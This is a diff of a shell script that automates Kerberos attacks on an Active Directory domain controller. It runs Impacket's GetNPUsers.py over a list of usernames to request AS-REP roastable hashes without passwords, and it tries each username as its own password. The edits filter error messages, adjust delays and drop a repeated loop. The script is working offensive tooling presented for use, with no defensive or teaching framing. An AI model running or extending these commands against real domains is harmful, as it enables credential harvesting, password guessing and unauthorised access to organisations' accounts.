@@ -88,12 +88,12 @@ then
 	for i in `cat names.txt`; do
 
 
-         python $toolkit/GetNPUsers.py $domain.local/$i -no-pass  -dc-ip $target -request
+         python $toolkit/GetNPUsers.py $domain.local/$i -no-pass  -dc-ip $target -request | grep -v "doesn't have" | grep -v "Client not found"
 	done
 fi
 
 
-sleep 1
+sleep 2
 
 echo " Trying username as password to kerberoast "
 sleep 3
@@ -106,7 +106,7 @@ then
 
 	for i in `cat names.txt`; do
 
-	python $toolkit/GetNPUsers.py $domain.local/$i:$i  -dc-ip $target -request
+	python $toolkit/GetNPUsers.py $domain.local/$i:$i  -dc-ip $target -request | grep -v "doesn't have" | grep -v "Client not found"
 	done
 
 fi
@@ -130,17 +130,8 @@ for i in `cat names.txt`; do
 
 
 
-python $toolkit/GetNPUsers.py $domain.local/$i -no-pass  -dc-ip $target -request
+python $toolkit/GetNPUsers.py $domain.local/$i -no-pass  -dc-ip $target -request | grep -v "doesn't have" | grep -v "Client not found"
 done
 
 sleep 2
-
-echo " Trying username as password to kerberoast "
-sleep 3
-
-for i in `cat names.txt`; do
-
-python $toolkit/GetNPUsers.py $domain.local/$i:$i  -dc-ip $target -request
-done
-
 echo "====== DONE :)  ===== "
